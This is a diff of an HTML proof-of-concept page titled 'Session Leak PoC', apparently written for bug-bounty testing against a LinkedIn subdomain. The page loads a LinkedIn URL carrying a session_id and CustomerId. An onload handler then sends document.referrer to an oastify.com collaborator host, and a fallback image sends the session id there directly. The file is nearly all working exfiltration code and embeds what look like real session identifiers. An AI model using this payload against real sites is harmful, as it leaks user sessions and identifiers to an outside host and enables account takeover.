@@ -1,13 +1,20 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Session Leak PoC</title></head>
+  <head>
+    <title>Session Leak PoC</title>
+  </head>
   <body>
     <h1>Session Leak PoC</h1>
 
-    <!-- Replace the real tokenized LinkedIn URL below -->
-    <img src="https://merchantpool1.linkedin.com/?session_id=4b6035c4-8d81-4780-8887-fbd1af53e03b&CustomerId=fb6bbd47-fa7c-4264-b4e9-b25948407586&PageId=&w=8DDC4A46F2683A5&mdt=1752696468110&rticks=1752696467495" 
-         alt="image"
-         referrerpolicy="no-referrer-when-downgrade"
-         onload="document.location='c6j1lkb089iwhg252kyrj6mmsdy4muaj.oastify.com/leak?ref=' + encodeURIComponent(document.referrer)">
+    <!-- Trigger session leak to merchantpool1 -->
+    <img 
+      src="https://merchantpool1.linkedin.com/?session_id=4b6035c4-8d81-4780-8887-fbd1af53e03b&CustomerId=fb6bbd47-fa7c-4264-b4e9-b25948407586&PageId=&w=8DDC4A46F2683A5&mdt=1752696468110&rticks=1752696467495" 
+      alt="trigger"
+      referrerpolicy="no-referrer-when-downgrade"
+      onload="(new Image()).src='https://c6j1lkb089iwhg252kyrj6mmsdy4muaj.oastify.com/leak?ref=' + encodeURIComponent(document.referrer);"
+    >
+
+    <!-- JS-less fallback -->
+    <img src="https://c6j1lkb089iwhg252kyrj6mmsdy4muaj.oastify.com/fallback?sid=4b6035c4-8d81-4780-8887-fbd1af53e03b" alt="leak" />
   </body>
 </html>
